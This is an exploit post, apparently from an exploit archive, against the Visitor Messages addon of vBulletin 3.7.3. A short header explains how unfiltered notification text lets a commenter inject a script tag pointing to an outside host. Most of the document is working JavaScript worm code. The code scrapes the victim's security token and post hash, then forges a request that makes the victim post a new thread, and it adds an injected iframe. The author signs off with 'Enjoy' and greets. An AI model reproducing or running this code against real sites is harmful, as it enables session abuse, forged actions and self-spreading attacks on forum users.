/* -----------------------------
 * Author      = Mx
 * Title       = vBulletin 3.7.3 Visitor Messages XSS/XSRF + worm
 * Software    = vBulletin
 * Addon       = Visitor Messages
 * Version     = 3.7.3
 * Attack      = XSS/XSRF

 - Description = A critical vulnerability exists in the new vBulletin 3.7.3 software which comes included
 + with the visitor messages addon (a clone of a social network wall/comment area).
 - When posting XSS, the data is run through htmlentities(); before being displayed
 + to the general public/forum members. However, when posting a new message,
 - a new notification is sent to the commentee. The commenter posts a XSS vector such as
 + &lt;script src=&quot;http://www.example2.com/nbd.js&quot;&gt;, and when the commentee visits usercp.php
 - under the domain, they are hit with an unfiltered xss attach. XSRF is also readily available
 + and I have included an example worm that makes the user post a new thread with your own
 - specified subject and message.

 * Enjoy. Greets to Zain, Ytcracker, and http://www.example.com which was the first subject
 * of the attack method.
 * ----------------------------- */

function getNewHttpObject() {
var objType = false;
try {
objType = new ActiveXObject(&#039;Msxml2.XMLHTTP&#039;);
} catch(e) {
try {
objType = new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;);
} catch(e) {
objType = new XMLHttpRequest();
}
}
return objType;
}

function getAXAH(url){

var theHttpRequest = getNewHttpObject();
theHttpRequest.onreadystatechange = function() {processAXAH();};
theHttpRequest.open(&quot;GET&quot;, url);
theHttpRequest.send(false);

function processAXAH(){
if (theHttpRequest.readyState == 4) {
if (theHttpRequest.status == 200) {

var str = theHttpRequest.responseText;
var secloc = str.indexOf(&#039;var SECURITYTOKEN = &quot;&#039;);
var sectok = str.substring(21+secloc,secloc+51+21);

var posloc = str.indexOf(&#039;posthash&quot; value=&quot;&#039;);
var postok = str.substring(17+posloc,posloc+32+17);

var subject = &#039;subject text&#039;;
var message = &#039;message text&#039;;

postAXAH(&#039;http://www.example.com/4um/newthread.php?do=postthread&amp;f=5&#039;, &#039;subject=&#039; + subject + &#039;&amp;message=&#039; + message + &#039;&amp;wysiwyg=0&amp;taglist=&amp;iconid=0&amp;s=&amp;securitytoken=&#039; + sectok + &#039;&amp;f=5&amp;do=postthread&amp;posthash=&#039; + postok + &#039;poststarttime=1&amp;loggedinuser=1&amp;sbutton=Submit+New+Thread&amp;signature=1&amp;parseurl=1&amp;emailupdate=0&amp;polloptions=4&#039;);

}
}
}
}








function postAXAH(url, params) {
var theHttpRequest = getNewHttpObject();
               
theHttpRequest.onreadystatechange = function() {processAXAHr(elementContainer);};
theHttpRequest.open(&quot;POST&quot;, url);
theHttpRequest.setRequestHeader(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded; charset=iso-8859-2&#039;);
theHttpRequest.send(params);

function processAXAHr(elementContainer){
if (theHttpRequest.readyState == 4) {
if (theHttpRequest.status == 200) {

}
}
}
}


getAXAH(&#039;http://www.example.com/4um/newthread.php?do=newthread&amp;f=5&#039;);
document.write(&#039;&lt;iframe src=&quot;http://www.example.com/4um/newthread.php?do=newthread&amp;f=5&quot;&gt;&#039;);

